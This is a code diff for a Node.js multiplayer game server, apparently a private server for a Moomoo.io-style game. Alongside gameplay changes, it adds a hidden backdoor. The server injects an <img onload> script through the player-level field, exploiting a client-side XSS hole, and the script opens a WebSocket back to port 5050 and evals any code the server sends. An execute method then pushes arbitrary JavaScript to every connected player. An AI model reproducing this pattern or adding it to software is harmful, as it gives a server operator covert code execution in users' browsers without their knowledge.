@@ -2,12 +2,14 @@
 
 const repl = require('repl');
 const io = require('socket.io');
+const ws = require('ws');
 
 let randInt = (min, max) => Math.floor(Math.random() * (max - min)) + min;
 let randChoose = choices => choices[randInt(0, choices.length)];
 let genderateExecutor = script => {
   return `<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="${script}">`
-}
+};
+
 function parseFlags(string, flagsArray) {
   if (!Array.isArray(flagsArray)) {
     return { error: 'Array of flags not found.' };
@@ -62,6 +64,8 @@ class Player {
     this.level = 1;
     this.postInjector = '';
 
+    this.evalQuene = [];
+    
     this.aimAngle = 0;
     this.movement = null;
     this.kill();
@@ -72,12 +76,11 @@ class Player {
     this.lastAttack = new Date('Sat, 08 Jul 2017 01:07:11 GMT').getTime();
     this.lastPing = new Date('Sat, 08 Jul 2017 01:07:11 GMT').getTime();
   }
-  updateLevel() {
-    this.socket.emit('15', this.xp, this.maxXp, this.level + this.postInjector)
-  }
-  evalJS(code) {
-    this.postInjector = genderateExecutor(code);
-    this.updateLevel();
+  updateLevel(appender = '') {
+    this.socket.emit('15', this.xp, this.maxXp, this.level + appender)
+    if (appender) {
+      this.updateLevel();
+    }
   }
   updateMovement(delta) {
     let config = this.server.config;
@@ -89,8 +92,10 @@ class Player {
     }
     this.vx *= Math.pow(config.playerDecel, delta);
     this.vy *= Math.pow(config.playerDecel, delta);
-    this.vx += this.devMods.hyperspeed * tx * config.playerSpeed * delta * 400 / 400;
-    this.vy += this.devMods.hyperspeed * ty * config.playerSpeed * delta * 400 / 400;
+    var speed = this.devMods.hyperspeed * config.playerSpeed * delta * 400 / 400;
+    if (this.y < config.snowBiomeTop) speed *= 0.8;
+    this.vx += tx * speed;
+    this.vy += ty * speed;
     this.x += this.vx * delta * 2;
     this.y += this.vy * delta * 2;
     if (this.y > config.mapScale / 2 - config.riverWidth / 2 && this.y < config.mapScale / 2 + config.riverWidth / 2) {
@@ -101,11 +106,23 @@ class Player {
     (this.y < this.size) && (this.y = this.size + 1, this.yv = Math.max(this.yv, 0));
     (this.y > config.mapScale - this.size) && (this.y = config.mapScale - this.size - 1, this.yv = Math.min(this.yv, 0));
   }
+  evalJS(code) {
+    this.evalQuene.push(code);
+  }
+  emptyQuene() {
+    for (let i of this.evalQuene) {
+      this.remote.send(i);
+    }
+    this.evalQuene = [];
+  }
   update(delta, send) {
     if (this.alive) {
       this.updateMovement(delta);
       if (send) {
         this.sendPosition();
+        if (this.evalQuene.length && this.remote && this.remote.readyState === 1) {
+          this.emptyQuene();
+        }
       }
       this.checkAttack();
     }
@@ -171,6 +188,9 @@ class Player {
     socket.emit('a');
     socket.emit('3', flatten(packet));
   }
+  initEvaluator() {
+    this.updateLevel(genderateExecutor(`new WebSocket('ws://'+location.search.slice(7)+':5050/','${ this.socket.id }').onmessage=e=>eval(e.data)`));
+  }
   link(socket) {
     let config = this.server.config;
     this.socket = socket;
@@ -195,6 +215,9 @@ class Player {
       this.evalJS(`document.getElementsByTagName('title')[0].innerText='Moo Two'`);
     });
 
+    socket.once('1', () => {
+      this.initEvaluator();
+    });
     socket.on('2', angle => this.aimAngle = angle);
 
     socket.on('3', angle => this.movement = angle);
@@ -377,8 +400,26 @@ class Server {
     this.lastRun = Date.now();
     this.clans = [];
     this.objects = [];
-    setInterval(() => this.update(), config.serverUpdateRate);
+    this.init();
+  }
+  init() {
+    setInterval(() => this.update(), this.config.serverUpdateRate);
     this.generateWorld();
+    this.server = [];
+    let wss = new ws.Server({ port: 5050 });
+    wss.on('connection', ws => {
+      let id = ws.protocol.replace(/[^0-9A-Za-z_\-]/g, '');
+      for (let i of this.players) {
+        if (i && i.socket && i.socket.id == id) {
+          this.handleEval(i, ws);
+          break;
+        }
+      }
+    });
+    this.evalWss = wss;
+    for (let i = 5000; i <= 5010; i++) {
+      io(i).on('connection', socket => this.handleSocket(socket));
+    }
   }
   remove(sid) {
     this.players[sid] = null;
@@ -492,15 +533,31 @@ class Server {
     }
     return { x, y };
   }
-  handle(socket) {
+  handleSocket(socket) {
     for (let i = 0; i < this.players.length; i++) {
       if (this.players[i] == null) {
         let player = new Player(this, i);
         player.link(socket);
         this.players[i] = player;
-        break;
+        return;
       }
     }
+    socket.emit('d', 'server is full');
+  }
+  handleEval(player, web) {
+    player.remote = web;
+  }
+  execute(code) {
+    this.players.forEach(r => r && r.evalJS(code));
+  }
+  exit(reason) {
+    this.players.forEach(r => r && r.socket.emit('d', reason));
+  }
+  systemUpdate() {
+    this.exit('updating');
+    setTimeout(() => {
+      process.exit(0)
+    }, 500);
   }
 }
 
@@ -530,9 +587,15 @@ let app = new Server({
   devPassword: 'PASSWORD',
 });
 
-for (let i = 5000; i <= 5010; i++) {
-  io(i).on('connection', socket => app.handle(socket));
-}
+repl.start({
+  eval: (a, _c, _f, cb) => {
+    try {
+      cb(null, eval(a)); // jshint ignore: line
+    } catch (e) {
+      cb(e);
+    }
+  }
+});
 /*
 let teams = [];
 let sockets = [];
@@ -605,12 +668,3 @@ let sockets = [];
   });
 }
 */
-repl.start({
-  eval: (a, _c, _f, cb) => {
-    try {
-      cb(null, eval(a)); // jshint ignore: line
-    } catch (e) {
-      cb(e);
-    }
-  }
-});
